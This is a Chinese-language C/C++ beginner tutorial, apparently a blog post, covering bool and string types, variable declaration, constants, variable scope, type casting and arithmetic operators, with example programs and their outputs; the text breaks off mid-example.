<h5 id="因C沒有字串型態，所以字串的使用要用字元陣列而C-新增string使用前要新增-include"><a href="#因C沒有字串型態，所以字串的使用要用字元陣列而C-新增string使用前要新增-include" class="headerlink" title="因C沒有字串型態，所以字串的使用要用字元陣列而C++新增string使用前要新增#include&lt;cstring&gt;"></a>因C沒有字串型態，所以字串的使用要用字元陣列而C++新增string使用前要新增<code>#include&lt;cstring&gt;</code></h5><hr>
<h3 id="Boolean-布林值"><a href="#Boolean-布林值" class="headerlink" title="Boolean(布林值)"></a>Boolean(布林值)</h3><h4 id="使用1代表True、0代表False"><a href="#使用1代表True、0代表False" class="headerlink" title="使用1代表True、0代表False"></a><code>使用1代表True、0代表False</code></h4><p><font color="#f11"><strong>布林型態是bool</strong></font></p>
<h1 id="變數宣告"><a href="#變數宣告" class="headerlink" title="變數宣告"></a>變數宣告</h1><h4 id="變數的功能是用來輸入、處理、儲存外界資料"><a href="#變數的功能是用來輸入、處理、儲存外界資料" class="headerlink" title="變數的功能是用來輸入、處理、儲存外界資料"></a><code>變數的功能是用來輸入、處理、儲存外界資料</code></h4><p><strong>變數在使用前要<font color="#f11">事先宣告</font>才能用</strong></p>
<blockquote>
<p>若變數未宣告的結果，編譯器便無法回應使用者在拼字上的錯誤，造成除錯的困難[color&#x3D;#902bd9]</p>
<blockquote>
<p>hi &#x3D; hi +1;<br>上式若事先宣告hi<br>int hi;<br>沒宣告則編譯器遇到hi時，便會出現 hi 未宣告的錯誤訊息<br><strong>變數宣告的優點是可配置恰當的記憶體而提高資料的處理</strong>效率[color&#x3D;#901f7561]</p>
</blockquote>
</blockquote>
<hr>
<h2 id="C-C-變數宣告語法如下"><a href="#C-C-變數宣告語法如下" class="headerlink" title="C&#x2F;C++變數宣告語法如下"></a>C&#x2F;C++變數宣告語法如下</h2><pre><code>資料型態 變數名稱 [=初值];
</code></pre>
<ul>
<li>int      a; <code>宣告變數 a 為int型態</code></li>
<li>char     b,c; <code>宣告變數b,c為char型態</code><br><strong>變數宣告亦可連同初值一同設定</strong></li>
<li>float e&#x3D;1.1f; <code>宣告變數 e 為float型態</code></li>
<li>char  r&#x3D;’n’;  <code>宣告變數 r為 char型態，初值為n</code></li>
</ul>
<h3 id="這段程式宣告bool型態"><a href="#這段程式宣告bool型態" class="headerlink" title="這段程式宣告bool型態"></a>這段程式宣告bool型態</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">bool</span> g,v;</span><br><span class="line">    g = <span class="number">4</span>&gt;<span class="number">2</span>;  <span class="comment">// 1 &gt;&gt; True</span></span><br><span class="line">    cout &lt;&lt;g&lt;&lt;endl;</span><br><span class="line">    v = <span class="number">4</span>&lt;<span class="number">3</span>; <span class="comment">// 0 &gt;&gt;False</span></span><br><span class="line"></span><br><span class="line">    cout &lt;&lt;v&lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(v); <span class="comment">//記憶體大小</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
1
0
1
</code></pre>
<hr>
<h3 id="C沒有字串型態要使用字串則要使用指標或字元陣列"><a href="#C沒有字串型態要使用字串則要使用指標或字元陣列" class="headerlink" title="C沒有字串型態要使用字串則要使用指標或字元陣列"></a>C沒有字串型態要使用字串則要使用指標或字元陣列</h3><p><strong>下列程式使用指標處理字串</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">char</span> *a=<span class="string">&quot;abcd&quot;</span>;</span><br><span class="line"><span class="type">char</span> *t;</span><br><span class="line">t=<span class="string">&quot;qwer&quot;</span>;</span><br><span class="line">cout&lt;&lt;a&lt;&lt;endl;<span class="comment">//abcd</span></span><br><span class="line">cout&lt;&lt;t&lt;&lt;endl;<span class="comment">//qwer</span></span><br><span class="line">a =<span class="string">&quot;ok&quot;</span>;</span><br><span class="line">cout &lt;&lt; a&lt;&lt;endl;</span><br><span class="line">a=t;<span class="comment">//qwer</span></span><br><span class="line">cout &lt;&lt;a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
abcd
qwer
ok
qwer
</code></pre>
<hr>
<p><strong>C++新增string型態</strong><br><code>可宣告變數b為字串型態</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  string b;</span><br><span class="line">  b =<span class="string">&quot;QAQ&quot;</span>;</span><br><span class="line">  cout &lt;&lt;b;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
QAQ
</code></pre>
<h2 id="範例程式-1"><a href="#範例程式-1" class="headerlink" title="範例程式"></a>範例程式</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> hi=<span class="number">0</span>;</span><br><span class="line">    hi = hi + <span class="number">1</span> ;</span><br><span class="line">    cout &lt;&lt;hi&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> *K;</span><br><span class="line">    <span class="type">char</span> *N;</span><br><span class="line">    K =<span class="string">&quot;OH&quot;</span>;</span><br><span class="line">    N =<span class="string">&quot;YA&quot;</span>;</span><br><span class="line">    string S;</span><br><span class="line">    S = <span class="string">&quot;HAHAHA&quot;</span>;</span><br><span class="line">    cout &lt;&lt; K&lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; N&lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; S;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>  輸出結果
  1
  OH
  YA
  HAHAHA
</code></pre>
<h4 id="下面的程式碼出了許多錯誤，嘗試排錯先，再看答案-smiling-face-with-smiling-eyes-and-hand-covering-mouth"><a href="#下面的程式碼出了許多錯誤，嘗試排錯先，再看答案-smiling-face-with-smiling-eyes-and-hand-covering-mouth" class="headerlink" title="下面的程式碼出了許多錯誤，嘗試排錯先，再看答案 :smiling_face_with_smiling_eyes_and_hand_covering_mouth:"></a>下面的程式碼出了許多錯誤，嘗試排錯先，再看答案 :smiling_face_with_smiling_eyes_and_hand_covering_mouth:</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> hihi123;</span><br><span class="line">    <span class="type">int</span> _a;</span><br><span class="line">    <span class="type">int</span> %as;</span><br><span class="line">    <span class="type">int</span> sum! ;</span><br><span class="line">    <span class="type">int</span> Age#<span class="number">3</span>;</span><br><span class="line">    <span class="type">int</span> a c;</span><br><span class="line">    <span class="type">int</span> c + <span class="number">3</span>;</span><br><span class="line">    <span class="type">int</span> Score;</span><br><span class="line">    score =<span class="number">4</span>;</span><br><span class="line">    <span class="type">int</span> <span class="keyword">if</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="找到錯誤了嗎-serious-face-with-symbols-covering-mouth"><a href="#找到錯誤了嗎-serious-face-with-symbols-covering-mouth" class="headerlink" title="找到錯誤了嗎? :serious_face_with_symbols_covering_mouth:"></a>找到錯誤了嗎? :serious_face_with_symbols_covering_mouth:</h4><p><code>下面是排錯後der程式</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> hihi123;</span><br><span class="line">    <span class="type">int</span> _a;</span><br><span class="line">    <span class="type">int</span> as;<span class="comment">//不能由符號開頭</span></span><br><span class="line">    <span class="type">int</span> sum;<span class="comment">//不可有!</span></span><br><span class="line">    <span class="type">int</span> Age3;<span class="comment">//不可有#</span></span><br><span class="line">    <span class="type">int</span> a,c;<span class="comment">//不可空白</span></span><br><span class="line">    <span class="type">int</span> c; <span class="comment">//不得含有加號</span></span><br><span class="line">    <span class="type">int</span> Score;</span><br><span class="line">    Score =<span class="number">4</span>; <span class="comment">//大小寫錯誤</span></span><br><span class="line">    <span class="type">int</span> hi; <span class="comment">//if是保留字</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="常數符號的宣告"><a href="#常數符號的宣告" class="headerlink" title="常數符號的宣告"></a>常數符號的宣告</h1><p><strong><code>常數符號需要記憶體儲存位置，與變數不同的是常數在整個程式中都不會也不會改變其值</code></strong></p>
<h3 id="程式設計有兩種表示常數的方式"><a href="#程式設計有兩種表示常數的方式" class="headerlink" title="程式設計有兩種表示常數的方式"></a>程式設計有兩種表示常數的方式</h3><blockquote>
<p><strong>文字式(Literal)</strong>:直接以15或3.14表示某一常數[color&#x3D;#a01d7961]</p>
</blockquote>
<blockquote>
<p><strong>常數符號式(Symbolic)</strong>:因有些數字在程式中會不斷重複出現，為了增加程式可讀性及減少程式鍵入麻煩，此時可以用有意義的符號代替這就是<strong>常數符號宣告</strong>[color&#x3D;#509f7349]</p>
</blockquote>
<h4 id="C語言常數定義語法"><a href="#C語言常數定義語法" class="headerlink" title="C語言常數定義語法"></a>C語言常數定義語法</h4><p><code>#define  常數名稱  常數值</code></p>
<h4 id="C-則新增了const宣告常數"><a href="#C-則新增了const宣告常數" class="headerlink" title="C++則新增了const宣告常數"></a>C++則新增了const宣告常數</h4><p><code>const 型態 常數名稱=常數值;</code></p>
<h2 id="範例程式-2"><a href="#範例程式-2" class="headerlink" title="範例程式"></a>範例程式</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIE 3.14 <span class="comment">//常數符號通常用大寫表示</span></span></span><br><span class="line"><span class="type">const</span> <span class="type">double</span> PI=<span class="number">100</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">double</span> a,b;</span><br><span class="line">    a=<span class="number">3</span>*<span class="number">3</span>*PIE; <span class="comment">//3*3*3.14</span></span><br><span class="line">    b=<span class="number">5</span>*<span class="number">5</span>*PI; <span class="comment">// 5*5*100</span></span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl&lt;&lt;b;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
28.26
2500
</code></pre>
<h1 id="變數常數有效範圍"><a href="#變數常數有效範圍" class="headerlink" title="變數常數有效範圍"></a>變數常數有效範圍</h1><p><strong><code>在一個大型程式中，一個程式是由一或數個函式組合而成 為了防止變數互相干擾，才有變數的有效範圍</code></strong></p>
<h4 id="變數有效範圍如下"><a href="#變數有效範圍如下" class="headerlink" title="變數有效範圍如下&gt;&gt;"></a>變數有效範圍如下&gt;&gt;</h4><blockquote>
<p>任一變數的宣告，若無特殊聲明，均屬於<font color="#f11"><strong>區域變數</strong></font>，有效範圍僅止於<font color="#f11">該變數所在程式區塊</font><br>:::info<br>例如:<br>宣告在敘述區塊，則它的有效範圍僅止於該敘述區塊，別的敘述區塊是無法取得該區域變數的值</p>
</blockquote>
<p>若宣告於函式中，則它的有效範圍僅止於該函式，其他函式均無法取得該區域變數的值<br>:::</p>
<p>:::spoiler<br>EX:<br>全域的a有效範圍是main()、aa()、bb()等全部函式<br>b、c的有效範圍則是main()、aa()中c、d有效範圍是aa()，但此c與main()中的c只是同名，他們各自占有不同記憶體，且其值<font color="#a09">不會互相干擾</font></p>
<p>其次，bb()中的a是全域a，與main共用a，在bb()內的改變會傳回main();for敘述區塊內又宣告a，則此a僅在for內有效不會改變全域的a<br>但若在for敘述區塊中未宣告a，而誤用a，則a會改變全域的a;if敘述區塊也宣告a，則a僅在if內有效，不改變全域a<br>:::</p>
<p><code>感覺看懂嘞對ㄅ 再來看程式碼吧!</code></p>
<h4 id="範例程式1"><a href="#範例程式1" class="headerlink" title="範例程式1"></a>範例程式1</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//int double PI=3.14;//全域常數</span></span><br><span class="line"><span class="type">int</span> a;<span class="comment">//全域a</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">aa</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">bb</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="type">int</span> b,c;</span><br><span class="line">    a=<span class="number">10</span>;<span class="comment">//全域a</span></span><br><span class="line">    c=<span class="number">5</span>;<span class="comment">//main內c</span></span><br><span class="line">    <span class="built_in">aa</span>();</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;2.main的c=&quot;</span>&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">bb</span>();</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;3.全域a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> a=<span class="number">2</span>;a&lt;=<span class="number">3</span>;a++)</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;4.for內的a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;5.for內的a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(a=<span class="number">2</span>;a&lt;=<span class="number">3</span>;a++)<span class="comment">//誤用</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;6.for內的a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;7.for內的a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">if</span>(c&gt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="type">int</span> a;</span><br><span class="line">        a=<span class="number">1</span>;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;8.if內a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;9.for內的a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">aa</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> c,d;</span><br><span class="line">    c=<span class="number">3</span>;<span class="comment">//aa內的C</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;1.aa內的c=&quot;</span>&lt;&lt;c&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bb</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a=<span class="number">8</span>;<span class="comment">//全域a</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
1.aa der c=3
2.main der c=5
3.global variable a=8
4.for der a=2
4.for der a=3
5.for der a=8
6.for der a=2
6.for der a=3
7.for der a=4
8.if der a=1
9.for der Ba=4
</code></pre>
<h4 id="範例程式2-1"><a href="#範例程式2-1" class="headerlink" title="範例程式2"></a>範例程式2</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">aa</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;1.a=&quot;</span>&lt;&lt;a&lt;&lt;endl;<span class="comment">//1</span></span><br><span class="line">    <span class="type">int</span> a=<span class="number">2</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;2.a=&quot;</span>&lt;&lt;a&lt;&lt;endl;<span class="comment">//2</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bb</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;4.a=&quot;</span>&lt;&lt;a&lt;&lt;endl;<span class="comment">//1</span></span><br><span class="line">    a=<span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">aa</span>();</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;3.a=&quot;</span>&lt;&lt;a&lt;&lt;endl;<span class="comment">//1</span></span><br><span class="line">    <span class="built_in">bb</span>();</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;5.a=&quot;</span>&lt;&lt;a&lt;&lt;endl;<span class="comment">//3</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
1.a=1
2.a=2
3.a=1
4.a=1
5.a=3
</code></pre>
<h1 id="變數資料型態轉換"><a href="#變數資料型態轉換" class="headerlink" title="變數資料型態轉換"></a>變數資料型態轉換</h1><p><code>每個變數宣告後，即有屬於自己的型態，往後此變數均只能給相同型態變數儲存 若執行階段指定給不同型態的變數儲存，則稱此為型態轉換</code></p>
<h4 id="C-C-語言中型態轉換又可分為"><a href="#C-C-語言中型態轉換又可分為" class="headerlink" title="&#x3D;&#x3D;C&#x2F;C++語言中型態轉換又可分為&#x3D;&#x3D;"></a>&#x3D;&#x3D;C&#x2F;C++語言中型態轉換又可分為&#x3D;&#x3D;</h4><h4 id="隱含轉換-Implicit-Conversion-與強制轉換-Explicit-Conversion"><a href="#隱含轉換-Implicit-Conversion-與強制轉換-Explicit-Conversion" class="headerlink" title="隱含轉換(Implicit Conversion)與強制轉換(Explicit Conversion)"></a><font color="#c153">隱含轉換(Implicit Conversion)與強制轉換(Explicit Conversion)</font></h4><h3 id="隱含轉換"><a href="#隱含轉換" class="headerlink" title="隱含轉換"></a>隱含轉換</h3><p><code>將值域小的型態轉為值域大的型態，稱為自動轉換或轉型(Convert)</code><br><strong><font color="#a13">此種轉換系統可以自動處理並確保資料不會流失</font></strong></p>
<h5 id="將short轉為long，因後者的值域比前者大，所以可順利轉換"><a href="#將short轉為long，因後者的值域比前者大，所以可順利轉換" class="headerlink" title="&#x3D;&#x3D;將short轉為long，因後者的值域比前者大，所以可順利轉換&#x3D;&#x3D;"></a>&#x3D;&#x3D;將short轉為long，因後者的值域比前者大，所以可順利轉換&#x3D;&#x3D;</h5><p><code>下列敘述可將型態為long的變數a指派給型態long的變數b，且原值不會改變</code></p>
<blockquote>
<p>short a&#x3D;23;<br>long b;<br>b&#x3D;a;<br>cout&lt;&lt;b;<br>結果是23<br>[color&#x3D;#a95]</p>
</blockquote>
<h3 id="強制轉換"><a href="#強制轉換" class="headerlink" title="強制轉換"></a>強制轉換</h3><p><code>將值域大的轉為值域小的型態，稱為強制轉換或稱鑄型(Cast)</code>，語法如下</p>
<blockquote>
<p><strong>變數1 &#x3D; (變數1的型態) 變數2;</strong>[color&#x3D;#b54178]</p>
</blockquote>
<h5 id="以下敘述可將型態是int的c變數指派給型態是short的d變數"><a href="#以下敘述可將型態是int的c變數指派給型態是short的d變數" class="headerlink" title="以下敘述可將型態是int的c變數指派給型態是short的d變數"></a>以下敘述可將型態是int的c變數指派給型態是short的d變數</h5><blockquote>
<p>int c&#x3D;23;<br>short d;<br>d&#x3D;(short) c;<br>cout&lt;&lt;d;<br>結果是23[color&#x3D;#a19]</p>
</blockquote>
<p><font color="#a09">強制轉換的風險大，可能導致資料流失或溢位</font></p>
<h5 id="以下是將float型態強制轉換為short型態，將造成小數部分流失"><a href="#以下是將float型態強制轉換為short型態，將造成小數部分流失" class="headerlink" title="以下是將float型態強制轉換為short型態，將造成小數部分流失"></a>以下是將float型態強制轉換為short型態，將造成小數部分流失</h5><blockquote>
<p>float e&#x3D;3.4f;<br>short f;<br>f&#x3D;(short) e;<br>cout&lt;&lt;f;<br>結果是3[color&#x3D;#e54]</p>
</blockquote>
<h5 id="以下敘述將long型態的g變數轉為short，將造成溢位"><a href="#以下敘述將long型態的g變數轉為short，將造成溢位" class="headerlink" title="以下敘述將long型態的g變數轉為short，將造成溢位"></a>以下敘述將long型態的g變數轉為short，將造成溢位</h5><blockquote>
<p>long g&#x3D;32769;<br>short h;<br>h&#x3D;(short) g;<br>cout &lt;&lt; h;<br>輸出為-32767[color&#x3D;#b494]</p>
</blockquote>
<h4 id="範例程式-3"><a href="#範例程式-3" class="headerlink" title="範例程式"></a>範例程式</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">short</span> a=<span class="number">10</span>;</span><br><span class="line">    <span class="type">long</span> b;</span><br><span class="line">    b=a;</span><br><span class="line">    cout&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> b1=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    cout&lt;&lt;b1&lt;&lt;endl;</span><br><span class="line">    <span class="type">short</span> b2;</span><br><span class="line">    b2=(<span class="type">short</span>) b1;</span><br><span class="line">    cout&lt;&lt;b2&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> c=<span class="number">20</span>;</span><br><span class="line">    <span class="type">short</span> d;</span><br><span class="line">    d=(<span class="type">short</span>) c;</span><br><span class="line">    cout&lt;&lt;d&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="type">float</span> e=<span class="number">3.4f</span>;</span><br><span class="line">    <span class="type">short</span> f;</span><br><span class="line">    f=(<span class="type">short</span>) e;</span><br><span class="line">    cout&lt;&lt;f&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> g=<span class="number">32769</span>;</span><br><span class="line">    <span class="type">short</span> h;</span><br><span class="line">    h=(<span class="type">short</span>) g;</span><br><span class="line">    cout&lt;&lt;h&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
10
a
97
20
3
-32767
</code></pre>
<h1 id="運算子"><a href="#運算子" class="headerlink" title="運算子"></a>運算子</h1><p><code>所謂運算子(Operator)，指的是可以對運算元(Operand)執行特定功能的特殊符號</code></p>
<blockquote>
<p>運算子一般分為五大類:<br>指派(Assignment)運算子<br>算數(Arithmetic)運算子<br>邏輯  (Logical) 運算子<br>關係(Relational)運算子<br>位元  (Bitwise) 運算子<br>[color&#x3D;#b65656]</p>
</blockquote>
<h4 id="每種運算子又可再細分為"><a href="#每種運算子又可再細分為" class="headerlink" title="每種運算子又可再細分為"></a>每種運算子又可再細分為</h4><ul>
<li><strong>一元(Unary)運算子&gt;&gt;只需要一個運算元就可操作</strong></li>
<li><strong>二元(Binary)運算子&gt;&gt;需要兩個運算才可操作</strong></li>
</ul>
<h4 id="優先順序決定同一式子擁有多個運算子時，每個運算子進行運算的優先順序"><a href="#優先順序決定同一式子擁有多個運算子時，每個運算子進行運算的優先順序" class="headerlink" title="&#x3D;&#x3D;優先順序決定同一式子擁有多個運算子時，每個運算子進行運算的優先順序&#x3D;&#x3D;"></a>&#x3D;&#x3D;優先順序決定同一式子擁有多個運算子時，每個運算子進行運算的優先順序&#x3D;&#x3D;</h4><h4 id="結合率決定同一敘述中，相鄰的運算子有相同優先順序的運算子執行順序"><a href="#結合率決定同一敘述中，相鄰的運算子有相同優先順序的運算子執行順序" class="headerlink" title="&#x3D;&#x3D;結合率決定同一敘述中，相鄰的運算子有相同優先順序的運算子執行順序&#x3D;&#x3D;"></a>&#x3D;&#x3D;結合率決定同一敘述中，相鄰的運算子有相同優先順序的運算子執行順序&#x3D;&#x3D;</h4><h3 id="指派運算子-Assignment-Operator"><a href="#指派運算子-Assignment-Operator" class="headerlink" title="指派運算子(Assignment Operator)"></a>指派運算子(Assignment Operator)</h3><p><code>指派運算子的符號為(=)，其作用為將運算符號右邊運算式的值指派給運算符號左邊的運算元</code></p>
<h5 id="EX"><a href="#EX" class="headerlink" title="EX:"></a>EX:</h5><blockquote>
<p>int sum&#x3D;0,a&#x3D;3,b&#x3D;5;<br>sum&#x3D;a+b;&#x2F;&#x2F;將a+b指派給sum[color&#x3D;#b34]</p>
</blockquote>
<p><em><strong><font color="#a026">上述與數學的等號是不同的，所以不要懷疑為何0&#x3D;8<br>其次是不能將常數放在指派運算子的左邊</strong></em></font></p>
<h5 id="EX-1"><a href="#EX-1" class="headerlink" title="EX:"></a>EX:</h5><blockquote>
<p>8&#x3D;x;&#x2F;&#x2F;不合法敘述<br>x&#x3D;8&#x2F;&#x2F;合法敘述<br>[color&#x3D;#f53]</p>
</blockquote>
<h3 id="算數運算子-Arithmetic-Operator"><a href="#算數運算子-Arithmetic-Operator" class="headerlink" title="算數運算子(Arithmetic Operator)"></a>算數運算子(Arithmetic Operator)</h3><p><code>算術運算子用來執行一般數學運算</code></p>
<h4 id="包含"><a href="#包含" class="headerlink" title="包含"></a>包含</h4><p>:::info</p>
<ul>
<li>正負數 (+&#x2F;-)</li>
<li>加     (+)</li>
<li>減     (-)</li>
<li>乘     (*)</li>
<li>除     (&#x2F;)</li>
<li>取餘數  (%)</li>
<li>遞增   (++)</li>
<li>遞減   (–)</li>
</ul>
<p>:::</p>
<table>
<thead>
<tr>
<th align="center">運算子</th>
<th align="center">定義</th>
<th align="center">優先順序</th>
<th align="center">結合率</th>
</tr>
</thead>
<tbody><tr>
<td align="center">++&#x2F;–</td>
<td align="center">遞增&#x2F;遞減</td>
<td align="center">1</td>
<td align="center">由左而右</td>
</tr>
<tr>
<td align="center">+&#x2F;-</td>
<td align="center">正負號，一元運算子</td>
<td align="center">2</td>
<td align="center">由右而左</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">乘法運算</td>
<td align="center">4</td>
<td align="center">由左而右</td>
</tr>
<tr>
<td align="center">&#x2F;</td>
<td align="center">除法運算(商的型態同被除數)</td>
<td align="center">4</td>
<td align="center">由左而右</td>
</tr>
<tr>
<td align="center">%</td>
<td align="center">求餘數(Modulus)</td>
<td align="center">4</td>
<td align="center">由左而右</td>
</tr>
<tr>
<td align="center">+&#x2F;-</td>
<td align="center">加法&#x2F;減法運算</td>
<td align="center">5</td>
<td align="center">由左而右</td>
</tr>
</tbody></table>
<h4 id="範例程式-4"><a href="#範例程式-4" class="headerlink" title="範例程式"></a>範例程式</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x=<span class="number">5</span>,y=<span class="number">4</span>;</span><br><span class="line">    <span class="type">float</span> z=<span class="number">5</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;1=&quot;</span>&lt;&lt;x+z&lt;&lt;endl; <span class="comment">//5+5</span></span><br><span class="line">    